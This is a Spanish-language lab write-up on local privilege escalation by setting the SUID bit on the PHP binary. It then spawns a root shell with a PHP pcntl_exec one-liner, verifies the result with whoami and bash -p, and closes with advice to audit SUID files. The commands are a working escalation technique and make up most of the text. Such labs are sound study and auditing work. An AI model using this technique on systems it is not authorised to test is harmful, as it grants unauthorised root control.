
---
# Laboratorio: Abuso de privilegios SUID con PHP

---

## Contexto

Los archivos con el bit SUID (Set User ID) permiten que cualquier usuario que los ejecute obtenga temporalmente los privilegios del propietario del archivo, usualmente `root`. En este laboratorio, configuraremos el binario `php` para que tenga el bit SUID activo y luego utilizaremos una técnica para escalar privilegios a root.

---

## Paso 1: Comprobar la ubicación y permisos del binario PHP

```bash
which php
# /usr/bin/php

ls -l /usr/bin/php
# lrwxrwxrwx 1 root root ... /usr/bin/php -> /etc/alternatives/php

ls -l /etc/alternatives/php
# lrwxrwxrwx 1 root root ... /etc/alternatives/php -> /usr/bin/php8.3

ls -l /usr/bin/php8.3
# -rwxr-xr-x 1 root root ... /usr/bin/php8.3
````

Explicación: verificamos que `php` es un enlace simbólico que finalmente apunta al binario `/usr/bin/php8.3`.

---

## Paso 2: Activar el bit SUID en el binario PHP

```bash
chmod u+s /usr/bin/php8.3
```

Explicación: asignamos el bit SUID al binario para que cualquier usuario que ejecute PHP lo haga con permisos de root.

---

## Paso 3: Cambiar al usuario limitado y ejecutar el código PHP para escalar privilegios

```bash
su Metahumo
php -r "pcntl_exec('/bin/sh', ['-p']);"
```

Explicación: con la opción `-r` ejecutamos código PHP inline que llama a `pcntl_exec` para lanzar una shell con el flag `-p` que preserva privilegios elevados.

---

## Paso 4: Verificar el escalado de privilegios

```bash
whoami
# root
bash -p 
# bash-5.1#
```

Explicación: confirmamos que ahora tenemos una shell con privilegios de root, demostrando el abuso del bit SUID en el binario PHP. Obtenemos una bash con privilegios root con el parámetro `-p` 

---

## Conclusiones

- El bit SUID puede ser un vector crítico para escalar privilegios si se establece en binarios que permitan ejecución arbitraria de código o comandos.
    
- PHP, aunque no suele tener el bit SUID por defecto, puede ser abusado para obtener shell root si se le asigna este permiso.
    
- Es fundamental auditar los archivos con SUID activado y restringir su uso para minimizar riesgos de escalada de privilegios.
    

---

